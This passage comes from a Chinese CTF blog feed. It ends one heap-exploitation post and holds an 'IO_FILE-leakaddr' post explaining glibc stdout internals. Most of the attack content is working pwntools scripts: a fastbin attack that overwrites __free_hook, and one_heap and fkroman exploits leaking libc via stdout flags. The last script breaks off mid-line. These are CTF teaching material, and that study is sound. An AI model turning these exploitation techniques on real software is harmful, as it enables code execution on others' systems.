class="string">"a"</span>*<span class="number">0x28</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3c4c08</span></span><br><span class="line">    main_arena = libc_base+<span class="number">0x3c4b20</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    one_gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    onegadget = libc_base+one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span>) <span class="comment">#chunk7/2复原</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">9</span>)  <span class="comment">#--&gt;2 fastbin</span></span><br><span class="line">    </span><br><span class="line">    fake_fastbin=main_arena+<span class="number">0x30</span></span><br><span class="line">    <span class="comment">#布置恢复chunk2,chunk3--    chunk3--》main_arena+0x30</span></span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\x00'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x0</span>)+<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(fake_fastbin)[:<span class="number">-1</span>]+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">1</span>,payload) <span class="comment">## change fastbin chain to form fastbin attack</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'a\n'</span>) </span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'a\n'</span>) </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=p64(free_hook<span class="number">-0xb58</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span> <span class="comment">#自行计算到free_hook的距离</span></span><br><span class="line">    add(<span class="number">0x50</span>,payload) <span class="comment">#7 写进main_arena里面</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\x00'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0</span>)+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#把空闲chunk填了，并在main_arena的位置开始add chunk直至freehook</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'a\n'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#13</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>) <span class="comment">#14</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#system-》free_hook</span></span><br><span class="line">    payload=<span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(system_addr)+<span class="string">'\n'</span></span><br><span class="line">    add(<span class="number">0x320</span>,payload) <span class="comment">#15</span></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\x00'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## trigger free to get shell</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>这题好像还能用fastbin attack做</p><h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><blockquote><p><a href="https://github.com/ray-cp/pwn_category/blob/master/heap/largebin_attack/lctf2017-2ez4u/exp.py" target="_blank" rel="noopener">https://github.com/ray-cp/pwn_category/blob/master/heap/largebin_attack/lctf2017-2ez4u/exp.py</a><br><a href="https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#2ez4u" target="_blank" rel="noopener">https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#2ez4u</a><br><a href="https://eternalsakura13.com/2018/03/21/lctf2/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/03/21/lctf2/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;unsortedbin-拆分smallbin和largebin：&quot;&gt;&lt;a href=&quot;#unsortedbin-拆分smallbin和largebin：&quot; class=&quot;headerlink&quot; title=&quot;unsortedbin 拆分smallbin和largebin：&quot;&gt;&lt;/a&gt;unsortedbin 拆分smallbin和largebin：&lt;/h2&gt;&lt;p&gt;把largebin放入large bin list里面的话得先解链，和unlink其实差不多，不过这里用到了nextsize&lt;/p&gt;
&lt;p&gt;glibc2.23   malloc/malloc.c:3470&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE-leakaddr</title>
    <link href="https://c0yo7e.github.io/2020/08/01/IO-FILE-leakaddr/"/>
    <id>https://c0yo7e.github.io/2020/08/01/IO-FILE-leakaddr/</id>
    <published>2020-08-01T14:01:50.000Z</published>
    <updated>2020-08-02T05:11:48.387Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任意读原理"><a href="#任意读原理" class="headerlink" title="任意读原理"></a>任意读原理</h3><p>stderr、stdout、stdin这三个函数拥有IO_FILE结构体，要利用IO_FILE实现任意读，就要利用到stdout。<br>首先，puts和write函数的执行，都会通过 <code>_IO_new_file_overflow</code> 这个函数最后执行 <code>_IO_overflow</code></p><blockquote><p><strong>puts</strong>:  <em>_IO_puts</em> –&gt; <em>_IO_sputn</em> –&gt; <em>_IO_new_file_xsputn</em> –&gt; <em>_IO_new_file_overflow</em> –&gt; <em>_IO_do_write</em> –&gt; <em>new_do_write</em> –&gt; <em>_IO_SYSWRITE</em></p><p><strong>fwrite</strong>: <em>_IO_fwrite</em> –&gt; <em>_IO_sputn</em> –&gt; <em>_IO_new_file_xsputn</em> –&gt; <em>_IO_new_file_overflow</em> –&gt; <em>_IO_do_write</em> –&gt; <em>new_do_write</em> –&gt; <em>_IO_SYSWRITE</em></p></blockquote><p>_IO_new_file_xsputn的源码：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">    if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;//判断缓存区有多少空间</span><br><span class="line">        count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">        if (count &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">         ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">    if (count &gt; 0)</span><br><span class="line">    &#123;//有空间的话就把数据拷贝至缓冲区</span><br><span class="line">        if (count &gt; to_do)</span><br><span class="line">            count = to_do;</span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        s += count;</span><br><span class="line">        to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">    if (to_do + must_flush &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        size_t block_size, do_write;</span><br><span class="line">        /* Next flush the (full) buffer. */</span><br><span class="line">        if (_IO_OVERFLOW (f, EOF) == EOF) //进入_IO_new_file_overflow</span><br><span class="line">        /* If nothing else has to be written we must not signal the caller that everything has been written.  */</span><br><span class="line">            return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></table></figure><p>_IO_new_file_overflow源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (FILE *f, int ch)</span><br><span class="line">&#123;</span><br><span class="line">    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    &#123;//不进入</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  /* If currently reading or no buffer allocated. */</span><br><span class="line">    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">    &#123;//不进入</span><br><span class="line">      /* Allocate a buffer if needed. */</span><br><span class="line">        if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          _IO_doallocbuf (f);</span><br><span class="line">          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    if (ch == EOF) //调用_IO_new_do_write</span><br><span class="line">        return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */</span><br><span class="line">        if (_IO_do_flush (f) == EOF)</span><br><span class="line">            return EOF;</span><br><span class="line">    *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">    if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">        if (_IO_do_write (f, f-&gt;_IO_write_base,  f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">            return EOF;</span><br><span class="line">  return (unsigned char) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_new_do_write的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static size_t</span><br><span class="line">new_do_write (FILE *fp, const char *data, size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">    size_t count;</span><br><span class="line">    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    /* On a system without a proper O_APPEND implementation,</span><br><span class="line">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">       Instead, just indicate that offset (before and after) is</span><br><span class="line">       unpredictable. */</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;//不能进入</span><br><span class="line">        off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">        // fseek(stdout, x, 1) always return _IO_pos_BAD (-1)</span><br><span class="line">        if (new_pos == _IO_pos_BAD)</span><br><span class="line">            return 0;</span><br><span class="line">        fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">    count = _IO_SYSWRITE (fp, data, to_do);//执行write</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/libio/libio.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES         0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br></pre></td></tr></table></figure><h6 id="关于flag的绕过："><a href="#关于flag的绕过：" class="headerlink" title="关于flag的绕过："></a>关于flag的绕过：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">综上，我们需要绕过的有：</span><br><span class="line">-  f-&gt;_flags &amp; _IO_NO_WRITES = 0</span><br><span class="line">-  f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1</span><br><span class="line">-  fp-&gt;_IO_read_end = fp-&gt;_IO_write_base 或者 _flag &amp; IO_IS_APPENDING = 1</span><br><span class="line">-  _fileno = 1</span><br><span class="line">-  _IO_write_base是我们传输给_IO_SYSWRITE的参数，即是我们leak出来的地址</span><br><span class="line">-  _IO_write_base与_IO_write_ptr的差是write出来的字节数，所以我们要覆盖base的低位使之变小</span><br></pre></td></tr></table></figure><p>_flags里面包含<code>_IO_IS_APPENDING</code>，<code>_IO_IS_APPENDING</code>的定义为<code>#define _IO_IS_APPENDING 0x1000</code>，这样就不会走后面的这个判断而直接执行到<code>_IO_SYSWRITE</code>了<br>按理是满足接下来这些条件就可以了的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#_IO_new_file_xsputn (if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)))</span></span><br><span class="line">&gt; f-&gt;flag &amp; 0xa00 &gt;0;</span><br><span class="line">&gt; <span class="comment">#_IO_new_file_overflow f-&gt;_flags &amp; _IO_NO_WRITES</span></span><br><span class="line">&gt; f-&gt;_flags &amp; 0x8 = 0;</span><br><span class="line">&gt; <span class="comment">#new_do_write if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span></span><br><span class="line">&gt; f-&gt;flag &amp; 0x1000 == 1;(&gt;0)</span><br><span class="line">&gt; f-&gt;write_base != f-&gt;write_ptr;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = 0xfbad0000</span><br><span class="line">flag &amp;= ~0x008 （最后一位）</span><br><span class="line">flag |= 0x0800 （倒数三位） 不能是奇数</span><br><span class="line">flag |= 0x1000 （倒数第四位） 不能是偶数</span><br><span class="line"></span><br><span class="line">--&gt; flag = 0xfbad1800</span><br></pre></td></tr></table></figure><h6 id="不改flag的绕过："><a href="#不改flag的绕过：" class="headerlink" title="不改flag的绕过："></a>不改flag的绕过：</h6><p>要使<code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>不成立才能执行write</p><p>所以要满足的条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_write_base指向想要泄露的地方。</span><br><span class="line">_IO_write_ptr指向泄露结束的地址。//两者要有差距</span><br><span class="line">_IO_read_end等于_IO_write_base以绕过多余的代码。</span><br><span class="line"></span><br><span class="line">//满足这三个条件，可实现任意读。</span><br></pre></td></tr></table></figure><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><h5 id="2019-one-heap"><a href="#2019-one-heap" class="headerlink" title="2019 one_heap"></a>2019 one_heap</h5><p>这是一道tcache+IO_FILE的题</p><p>有限的删除数量，就利用tcache机制构造chunk，将chunk写进unsorted bin里</p><p>指针指向stdout，实现覆写flag和write_base等数据，leak出libc的地址，然后unsorted bin attack 更改realloc_hook。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">"./one_heap"</span>)</span><br><span class="line"><span class="comment">#p = remote('47.104.89.129',10001)</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x2f</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x20</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'\x60\x97\n'</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc.address=u64((p.recv(<span class="number">6</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ed8b0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">realloc_hook=libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">one_gadget = libc.address+<span class="number">0x10a38c</span></span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">0</span>)*<span class="number">10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(realloc_hook)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(one_gadget)+p64(realloc+<span class="number">4</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h5 id="2109-数字经济-fkroman"><a href="#2109-数字经济-fkroman" class="headerlink" title="2109 数字经济 fkroman"></a>2109 数字经济 fkroman</h5><p>没办法通过show函数leak出libc的地址，所以我们会想到IO_FILE<br>漏洞，可以uaf，然后，edit可以自己重写size，造成溢出，重构fd，达到任意地址写的目的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./fkroman'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)  <span class="comment">#0</span></span><br><span class="line"><span class="comment"># edit(0,0x68,'a'*0x68)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment"># add(3,0x68)</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delt(<span class="number">1</span>) </span><br><span class="line">edit(<span class="number">1</span>,<span class="number">2</span>,<span class="string">'\xdd\x25'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">pay = <span class="number">0x33</span>*<span class="string">'A'</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)</span><br><span class="line">stderr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> 